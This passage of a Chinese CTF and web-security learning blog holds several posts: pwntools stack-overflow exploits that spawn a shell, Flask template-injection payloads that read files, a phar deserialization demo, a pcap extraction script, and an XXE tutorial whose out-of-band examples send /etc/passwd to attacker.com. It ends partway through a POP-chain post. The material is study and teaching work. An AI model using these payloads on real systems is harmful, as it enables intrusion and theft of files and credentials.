<p>64位，字符串搜到“flag is what you input”，明白了本题的意思，然后跟进，往上溯源看到了unk_404040，得到了一些数据：</p>
<p><img src="https://s3.ax1x.com/2020/11/15/DFuWkT.jpg" alt></p>
<p>整理并且转为十进制得到：</p>
<blockquote>
<p>150, 48, 144, 106, 159, 54, 39, 116, 179, 49, 157,95,142, 95, 17, 97, 157, 121, 39, 118, 131</p>
</blockquote>
<p>发现有一些并不能转为ascall</p>
<p>后续根据动态调试，我发现我们输入的数据存入内存后会发生变换，不是原先的数据，再拿变换后的数据与上面这串数字进行比对。</p>
<p>这里举一个例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//输入的数据：</span></span><br><span class="line"><span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">0</span>A <span class="number">0</span>A</span><br><span class="line"><span class="comment">//经过观察发现，当call 4017D0函数后 数据变为了:</span></span><br><span class="line"><span class="number">5</span>C <span class="number">61</span> <span class="number">5</span>C <span class="number">61</span> <span class="number">5</span>C <span class="number">61</span> <span class="number">5</span>C <span class="number">61</span> AF <span class="number">0</span>A</span><br></pre></td></tr></table></figure>

<p>发现都是隔着一个进行变换，再结合上面的这串不能转换为ascall的数字，发现偶数位的可以转换ascall，而奇数位都很奇怪，那是因为做了转换。</p>
<p>具体变换的算法我没有深入研究，我只是不断调试，把每一个字符（a-z,A-Z,0-9）试了过去。</p>
<p>根据动调发现 4017D0这个函数很重要，在这里下断点，然后尝试输入不同的字符，最后得到flag：</p>
<p>unctf{90dj06_th1s_A_3asy_vm}</p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h3 id="0x1-YLBNB"><a href="#0x1-YLBNB" class="headerlink" title="0x1 YLBNB"></a>0x1 YLBNB</h3><p>直接远程连接即可:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'45.158.33.12'</span>,<span class="number">8000</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="0x2-fan"><a href="#0x2-fan" class="headerlink" title="0x2 fan"></a>0x2 fan</h3><p>纯栈溢出，然后返回到system(“/bin/sh”)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p=process('./pwn')</span></span><br><span class="line">p=remote(<span class="string">'node2.hackingfor.fun'</span>,<span class="number">34518</span>)</span><br><span class="line">vul= <span class="number">0x400735</span></span><br><span class="line">payload=<span class="string">'a'</span>*(<span class="number">0x30</span>+<span class="number">0x8</span>)+p64(vul)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="0x3-do-you-like-me"><a href="#0x3-do-you-like-me" class="headerlink" title="0x3 do_you_like_me?"></a>0x3 do_you_like_me?</h3><p>本题和fan题解法一样</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p=process('./pwn')</span></span><br><span class="line">p=remote(<span class="string">'node2.hackingfor.fun'</span>,<span class="number">38675</span>)</span><br><span class="line">vul= <span class="number">0x4006cd</span></span><br><span class="line">payload=<span class="string">'a'</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>)+p64(vul)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>UNCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>flask学习</title>
    <url>/2020/08/14/flask%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>就主要就记录下flask模板注入的一些payload</p>
<p>切片法，省去了一个个找的步骤</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'txt.galf_eht_si_siht/'</span>[::<span class="number">-1</span>],<span class="string">'r'</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">`&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'txt.galf_eht_si_siht/'</span>[::<span class="number">-1</span>],<span class="string">'r'</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; `</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title>phar反序列化的一些理解</title>
    <url>/2020/06/24/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<h3 id="1-为什么要利用phar"><a href="#1-为什么要利用phar" class="headerlink" title="1.为什么要利用phar"></a>1.为什么要利用phar</h3><p><img src="/2020/06/24/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/1.png" alt="1"></p>
<p>一些题目需要用到反序列化去读取文件，但是却没有提供unserialize()时就可以利用phar</p>
<h3 id="2-利用php生成phar文件"><a href="#2-利用php生成phar文件" class="headerlink" title="2.利用php生成phar文件"></a>2.利用php生成phar文件</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);<span class="comment">//删除文件，确保phar.phar不存在</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);<span class="comment">//新建一个phar包</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);<span class="comment">//设置stub</span></span><br><span class="line">$o = <span class="keyword">new</span> TestObject();</span><br><span class="line">$phar-&gt;setMetadata($o);<span class="comment">//将自定义的meta-data存入mainfest，也就是需要被序列化的对象，这一步最重要</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>,<span class="string">"test"</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过上述代码生成的文件如图，可以看到已经将TestObject类序列化了，此时上传再去用phar协议读取就会触发反序列化</p>
<p><img src="/2020/06/24/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/2.png" alt="2"></p>
<h3 id="3-受影响的函数"><a href="#3-受影响的函数" class="headerlink" title="3.受影响的函数"></a>3.受影响的函数</h3><p><img src="/2020/06/24/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/3.png" alt="3"></p>
<p>当看到这些函数时就表明可以用phar这种方法了</p>
<p>例子如下，当去用file_get_contents去读取phar包中的test.txt文件时，就会触发反序列化 ,调</p>
<p>用TestObject类，于是TestObject中的的魔术方法就被调用了，会输出Destruct called</p>
<p><img src="/2020/06/24/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/4.png" alt="4"></p>
<p><img src="/2020/06/24/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/5.png" alt="5"></p>
<h3 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h3><p>总算是对phar有了一定的了解，关于如何去构造pop链，提高代码审计能力才是最关键的一点，努力去学php吧，接下来应该还会做几道关于反序列化的题</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>php代码审计</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>pyshark模块的一些用法</title>
    <url>/2020/08/05/pyshark%E6%A8%A1%E5%9D%97%E7%9A%84%E4%B8%80%E4%BA%9B%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<p>好久没更新了，随便写点吧，懒是真的懒，懒狗没救了( ╯□╰ )</p>
<p>做了道比较简单的流量分析题，主要学到了pyshark的一些简单操作，题目是这个</p>
<ul>
<li>工业信息安全技能大赛-2019-山东站-线上-简单流量分析</li>
</ul>
<p>打开文件一看发现是一堆icmp流量，观察一下数据长度发现没超过126的，应该是ascii码没错了</p>
<p><img src="/2020/08/05/pyshark%E6%A8%A1%E5%9D%97%E7%9A%84%E4%B8%80%E4%BA%9B%E7%94%A8%E6%B3%95/1.png" alt></p>
<p>之后当然是写个脚本提取一下了，脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">L_flag = []</span><br><span class="line">packets = pyshark.FileCapture(<span class="string">'fetus_pcap.pcap'</span>)</span><br><span class="line"><span class="keyword">for</span> packet <span class="keyword">in</span> packets:</span><br><span class="line">    <span class="comment"># print(type(packet))  # 整个包，type是&lt;class 'pyshark.packet.packet.Packet'&gt;</span></span><br><span class="line">    <span class="keyword">for</span> pkt <span class="keyword">in</span> packet:</span><br><span class="line">        <span class="comment"># print(type(pkt))  # 分成了三个layer，type是&lt;class 'pyshark.packet.layer.Layer'&gt;</span></span><br><span class="line">        <span class="keyword">if</span> pkt.layer_name == <span class="string">"icmp"</span>:  <span class="comment"># 判断包类型是否为icmp</span></span><br><span class="line">            <span class="comment"># print(pkt.type)</span></span><br><span class="line">            <span class="keyword">if</span> int(pkt.type) != <span class="number">0</span>:  <span class="comment"># 判断是否为请求包，请求包为8，响应包为0</span></span><br><span class="line">                <span class="comment"># print(pkt.type)</span></span><br><span class="line">                L_flag.append(int(pkt.data_len))  <span class="comment"># 获取长度</span></span><br><span class="line">c = len(L_flag)</span><br><span class="line">print(L_flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, c):</span><br><span class="line">    L_flag[i] = chr(L_flag[i])</span><br><span class="line">print(<span class="string">''</span>.join(L_flag))</span><br><span class="line">print(base64.b64decode(<span class="string">''</span>.join(L_flag)))</span><br></pre></td></tr></table></figure>

<p>把所有请求包长度提取出来转换为字符，发现是base64，解码后得到flag</p>
<p><code>Ojpcbm1vbmdvZGI6IToxNzg0MzowOjk5OTk5Ojc6OjpcbnVidW50dTokNiRMaEhSb21URSRNN0M0bjg0VWNGTEFHe3h4MmI4YV82bW02NGNfZnNvY2lldHl9Ojo=
b&#39;::\\nmongodb:!:17843:0:99999:7:::\\nubuntu:$6$LhHRomTE$M7C4n84UcFLAG{xx2b8a_6mm64c_fsociety}::&#39;</code></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title>xml实体注入(xxe)</title>
    <url>/2020/07/24/xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5-xxe/</url>
    <content><![CDATA[<p>这几天突然想了解一下什么是xml实体注入，于是在b站看到了<a href="https://www.bilibili.com/video/BV1at41177SA" target="_blank" rel="noopener">这个视频</a>，讲的挺不错的，但理解还不是很深刻，所以写下这篇博客记录一下。</p>
<p>基本上大致知道了如何去利用xml实体注入，所以为了节省时间（也还是懒）,就照搬一下这位师傅的<a href="https://www.cnblogs.com/xiaoxiaosen/p/13093985.html" target="_blank" rel="noopener">这篇博客</a>，加上一些自己的看法，写下这篇博客</p>
<h2 id="一、什么是xml"><a href="#一、什么是xml" class="headerlink" title="一、什么是xml"></a>一、什么是xml</h2><p>XML（可扩展标记语言）与HTML类似，但HTML与数据表示有关，而XML更多与数据传输、存储有关。</p>
<p>先来看看xml文档格式：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span>  //元数据，版本为xml解析器解析的版本</span><br><span class="line"><span class="tag">&lt;<span class="name">Person</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Name</span>&gt;</span>John<span class="tag">&lt;/<span class="name">Name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Age</span>&gt;</span>20<span class="tag">&lt;/<span class="name">Age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Person</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;Person&gt;&lt;/Person&gt;</code>为根元素，有且仅有一个</p>
<p>需要注意的是，标签对大小写敏感，前后标签必须一致，如<code>&lt;read&gt;&lt;/Read&gt;</code>则是错误的，必须<code>&lt;read&gt;&lt;/read&gt;</code></p>
<p><code>&lt; ，&gt; ，&quot; ，&#39; , &amp;</code>等符号不被允许直接出现在XML文档中，因为xml解析器会搞不清这些符号是数据还是标签</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Age</span>&gt;</span>20 <span class="tag">&lt; &gt;</span> &amp; " '<span class="tag">&lt;/<span class="name">Age</span>&gt;</span>   //×错误</span><br></pre></td></tr></table></figure>

<p>那么这个时候就需要Entity来解决这个问题 </p>
<h2 id="二、关于Entity实体"><a href="#二、关于Entity实体" class="headerlink" title="二、关于Entity实体"></a>二、关于Entity实体</h2><p>Entity（可用实体）：一种简单的存储单元，好比xml的变量，可以对它进行赋值，并在xml文档的不同地方对它进行引用。</p>
<p>实体（Entity）在xml文档中的文档类型定义部分（DTD）被单独定义描述。</p>
<p>举个栗子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 &lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">2 &lt;!DOCTYPE Person [</span><br><span class="line">3     &lt;! ENTITY name &quot;John&quot;&gt;   &#x2F;&#x2F;定义了一个存储单元，这个简单Entity名称就为name，将john放入了name这个实体中</span><br><span class="line">4 ]&gt; </span><br><span class="line">&#x2F;&#x2F;换行写是格式规范，如果将其写成一行如下，可以看到括号都是匹配的</span><br><span class="line">&#x2F;&#x2F;&lt;!DOCTYPE Person [&lt;! ENTITY name &quot;John&quot;&gt;]&gt;</span><br><span class="line">5 &lt;Person&gt;</span><br><span class="line">6     &lt;Name&gt;&amp;name;&lt;&#x2F;Name&gt;  </span><br><span class="line">&#x2F;&#x2F;用&amp;符号调用实体name才能成功执行，也不要忘记最后的分号</span><br><span class="line">7     &lt;Age&gt;20&lt;&#x2F;Age&gt;</span><br><span class="line">8 &lt;&#x2F;Person&gt;</span><br></pre></td></tr></table></figure>

<p>2~4行代码就是通过DTD方式创建了一个ENTITY告知xml解析器这是一个DTD定义类型</p>
<p><strong>Entity分为三类</strong></p>
<p>①一般实体General（通用型实体）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">&lt;!ENTITY name &quot;pwn&quot;?&gt;</span><br><span class="line">...</span><br><span class="line">&lt;hello&gt;&amp;name;&lt;&#x2F;hello&gt;</span><br></pre></td></tr></table></figure>

<p>通用型实体就是上面举的那个栗子</p>
<p>ps：原博客这里写错了，我改了下</p>
<p>②参数实体Parameter（必须预定在单独的DTD区域）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % outer &quot;&lt;! ENTITY inner &#39;John&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>区别貌似就是定义实体名字的时候要加<code>%</code>，还有参数实体可以用一个Entity给另一个Entity赋值，也由于这个特性，在xxe中挺有作用的，可以想办法套娃绕过之类的</p>
<p>③预定义实体Predefined（某些特殊符号的一组预定义数值集）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;hello&gt;&amp;#x3c;&lt;&#x2F;hello&gt;  &#x2F;&#x2F; &lt;的十六进制表示</span><br></pre></td></tr></table></figure>

<p>用<code>&amp;#x3c;</code>代替<code>&lt;</code>就可以避免xml解释器报错了</p>
<h2 id="三、外部实体（Xml-External-Entity）"><a href="#三、外部实体（Xml-External-Entity）" class="headerlink" title="三、外部实体（Xml External Entity）"></a>三、外部实体（Xml External Entity）</h2><p>实体（Entity）有哪些用途呢？</p>
<ol>
<li><p>存储指定数值；</p>
</li>
<li><p>从本地文件、从远程网络中调用相关数据，作为后续实体引用;</p>
</li>
</ol>
<p>那么这就会出现问题</p>
<p>我们先来看看外部实体的一个实例，来帮助我们了解其工作机制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE XXE [</span><br><span class="line">    &lt;! ENTITY subscribe SYSTEM &quot;secret.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;pwn&gt;&amp;subscribe;&lt;&#x2F;pwn&gt;</span><br></pre></td></tr></table></figure>

<p>SYSTEM 关键字让xml解析器知道该实体是一个外部实体，需要xml解析器去获取 “ secret.txt ” 其中的外部资源，并把它存储到内部实体 subscribe 中</p>
<p><strong>需要注意的是，如果secret.txt中的内容如果包含<code>&lt;,&gt;</code>等xml语法中的标签，那么xml解析器就会报错，也就不能读取其中的内容了，至于如何解决这个问题，后面会提到</strong></p>
<p><code>&lt;pwn&gt;&amp;subscribe;&lt;/pwn&gt;</code>表示内部实体<code>subscribe</code>会后续在<code>&lt;pwn&gt;</code>标签中被调用</p>
<p><code>secret.txt</code>其中的内容被赋值到了内部实体<code>subscibe</code>中</p>
<p>其中的SYSTEM后面可以跟URI，即<code>STSYEM “URI”</code></p>
<p>这里支持有效的URI（文件、http、ftp和其他协议形式内容，如<code>SYSTEM &quot;http://127.0.0.1&quot;</code>）</p>
<h2 id="四、外部实体注入-（XXE）"><a href="#四、外部实体注入-（XXE）" class="headerlink" title="四、外部实体注入 （XXE）"></a>四、外部实体注入 （XXE）</h2><p>分类：</p>
<ul>
<li><p>带内数据 in-band （就是我们上面举的外部实体的那个栗子，将内部的数据带出来，应该也是比赛最常见的，直接读取/flag之类的）</p>
</li>
<li><p>基于错误 error-based （有点像盲注，解析结果没有其他，只有一堆报错，就类似报错注入吧）</p>
</li>
<li><p>带外数据 out-of-band（真正的盲注，无任何回显，需要借助服务器监听外带数据）</p>
</li>
</ul>
<p><strong>按照视频里讲的，这里再主要介绍一下OOB XXE，下面的这些解释也是完全按照视频的原话来的，可能讲的也不太清楚</strong></p>
<p>OOB XXE（盲注XXE）</p>
<p>当我们遇到这种情况时，一个web应用程序，它可以解析XML输入，但是却无任何输出响应，必须用带外请求把目标提取出来，为了测试这种盲注XXE，我们可以用非文件路径的外部实体来请求这里的web应用。</p>
<p>例如，在存在xxe漏洞的地方，输入以下代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE XXE [</span><br><span class="line">&lt;!ENTITY subscrible SYSTEM &quot;http:&#x2F;&#x2F;attack.com:1337&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;pwn&gt;&amp;subscrible;&lt;&#x2F;pwn&gt;</span><br></pre></td></tr></table></figure>

<p>在攻击机attack.com主机上监听1337端口</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">ncat -lp 1337</span><br></pre></td></tr></table></figure>

<p>可以看见有反应</p>
<p>XXE ——————&gt; server ———————-&gt;attack.com</p>
<p>受害端有效解析了xml，正尝试获取我们在attack.com上的资源作为实体引用，这样我们就能以受害端的身份发起请求了，这就是<strong>SSRF</strong></p>
<h2 id="五、加载外部DTD"><a href="#五、加载外部DTD" class="headerlink" title="五、加载外部DTD"></a>五、加载外部DTD</h2><p>DTD并不是xml数据的一部分，它们总是再根元素的定义之上，所以DTD也可以像实体一样，从外部加载，如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE Pwn SYSTEM &quot;external.dtd&quot;&gt;</span><br><span class="line">&lt;Pwn&gt;test&lt;&#x2F;Pwn&gt;</span><br></pre></td></tr></table></figure>

<p>程序解析时，解析器将从外部DTD中提取并解析内容，这种机制可以构造结构良好的xml文档，因为它将定义和数据部分区分了开来，但同时也带来了更加广的攻击面</p>
<p>上面的例子中调用的<code>external.dtd</code>内容如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % name &quot;JEF&quot;&gt;</span><br><span class="line">&lt;!ENTITY % outer &quot;&lt;!ENTITY inner &#39;My name is %name;&#39;&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>再来通过一个例子更加直观的来看看xml解析器解析的过程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE Pwn [</span><br><span class="line">	&lt;!ENTITY % parameter_entity &quot;&lt;!ENTITY general_entity &#39;PwnFunction&#39;&gt;&quot;  </span><br><span class="line">    %parameter_entity; &#x2F;&#x2F;参数实体只能在当前DTD中调用</span><br><span class="line">    &#x2F;&#x2F;等效于&lt;!ENTITY general_entity &#39;PwnFunction&#39;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;pwn&gt;&amp;general_entity;&lt;&#x2F;pwn&gt;</span><br></pre></td></tr></table></figure>

<p>这个例子中，我们定义了一个参数实体<code>parameter_entity</code>，而这个参数实体的值，又是通过另一个参数实体<code>general_entity</code>来定义的，这种方式我们上面也讲到过</p>
<p>再在DTD中调用<code>%parameter_entity;</code>即等效于<code>&lt;!ENTITY general_entity &#39;PwnFunction&#39;&gt;</code></p>
<p>最后在根元素中调用<code>&amp;general_entity;</code>即完成了整个流程</p>
<p>接下来再看一个盲注XXE的具体例子吧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE XXE [</span><br><span class="line">    &lt;!ENTITY % passwd SYSTEM &quot;&#x2F;etc&#x2F;passwd&quot;</span><br><span class="line">    &lt;!ENTITY % wrapper &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;attacker.com&#x2F;?%passwd;&#39;&gt;&quot;&gt;</span><br><span class="line">    %wrapper;</span><br><span class="line">]</span><br><span class="line">&lt;pwn&gt;&amp;send;&lt;&#x2F;pwn&gt;</span><br></pre></td></tr></table></figure>

<p>上面这个例子中，读取了/etc/passwd中的内容，通过http的方式将数据带出，<code>%wrapper</code>就相当于<code>&lt;!ENTITY send SYSTEM &#39;http://attacker.com/?CONTENTS_OF_PASSWD&#39;</code></p>
<p>但如果直接使用上面这个例子，那么肯定会报错，因为xml的规定中，不能在实际的标记语言中在调用实体参数，即在<code>http://attacker.com/?%passwd;</code>直接调用%passwd这一步是错误的，但可以在同级别中被当作标记语言调用，即<code>%wrapper;</code>是正确的（挺奇葩的规定）</p>
<p>但是上面的规则仅限于内部DTD，所以为了上面这种情况的发生，就可以用外部DTD来绕过它，如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;attacker.com&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">&lt;data&gt;&amp;send;&lt;&#x2F;data&gt;</span><br></pre></td></tr></table></figure>

<p>其中evil.dtd中的内容就是之前读取/etc/passwd的部分，如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % passwd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;</span><br><span class="line">&lt;!ENTITY % wrapper &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;attacker.com&#x2F;?%passwd;&#39;&gt;&quot;&gt;</span><br><span class="line">%wrapper;</span><br></pre></td></tr></table></figure>

<p>这样，就成功读取到了/etc/passwd中的内容到我们的攻击机上</p>
<h2 id="六、当读取的内容中有xml语法标签时"><a href="#六、当读取的内容中有xml语法标签时" class="headerlink" title="六、当读取的内容中有xml语法标签时"></a>六、当读取的内容中有xml语法标签时</h2><p>还是用五中的例子，如果我们换成读取/etc/fstab中的内容时，会发现读取失败了，因为其中有xml语法标签<code>&lt;,&gt;</code>，如图</p>
<p><img src="/2020/07/24/xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5-xxe/1.png" alt="1"></p>
<p>那么要如何去读取数据呢？这里就要用到CDATA</p>
<p>CDATA表示字符数据，它是一种特殊语法，在CDATA开闭标签中的文本部分不会被XML标记语言解析处理，也就达到了我们的目的，它的格式如下</p>
<p><code>&lt;![CDATA[ &lt;text&gt; ]]&gt;</code></p>
<p>如果直接写在一个DTD中，也会报五中一样的错误，所以这里也需要用到加载外部DTD的方法，如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;evil.dtd&quot;&gt;</span><br><span class="line">&lt;data&gt;&amp;all;&lt;&#x2F;data&gt;</span><br></pre></td></tr></table></figure>

<p>其中evil.dtd的内容是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;fstab&quot;</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;    </span><br><span class="line">&lt;!ENTITY % wrapper &quot;&lt;!ENTITY all &#39;%start;%file;%end;&#39;&gt;&quot;&gt;</span><br><span class="line">%wrapper;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实xxe这部分内容也不是很多，视频也就20分钟左右，但主要是从来没了解过，这次算是了解的比较清楚了。最近老是偷懒，又感觉没了学习的动力，博客也更新的少了，这样下去不行啊，得赶紧调整状态，落下了就是落下了，还是很难受的。</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>xml</tag>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>关于pop链的学习</title>
    <url>/2020/06/24/%E5%85%B3%E4%BA%8Epop%E9%93%BE%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h3><p><a href="https://www.bilibili.com/video/BV1oE411j7aF" target="_blank" rel="noopener">2020-3-1-prontosil-反序列化与POP链</a></p>
<h3 id="各种魔术方法的调用过程"><a href="#各种魔术方法的调用过程" class="headerlink" title="各种魔术方法的调用过程"></a>各种魔术方法的调用过程</h3><p><img src="/2020/06/24/%E5%85%B3%E4%BA%8Epop%E9%93%BE%E7%9A%84%E5%AD%A6%E4%B9%A0/1.png" alt="1"></p>
<p>这里__get()和__set的定义不准确</p>
<p>当我们试图获取一个不可达属性时(比如private)，类会自动调用__get函数。<br>当试图设置一个不可达属性时(比如private)，类会自动调用__set函数</p>
<p>具体的给出一个链接，可以看这篇博客</p>
<p><a href="https://www.cnblogs.com/phpper/p/9384183.html" target="_blank" rel="noopener">PHP中的__get和__set理解</a></p>
<h3 id="实例中pop链的构造"><a href="#实例中pop链的构造" class="headerlink" title="实例中pop链的构造"></a>实例中pop链的构造</h3><p>首先是源码（把题目手打了一遍emmmm）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;file_get(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">        <span class="keyword">echo</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span 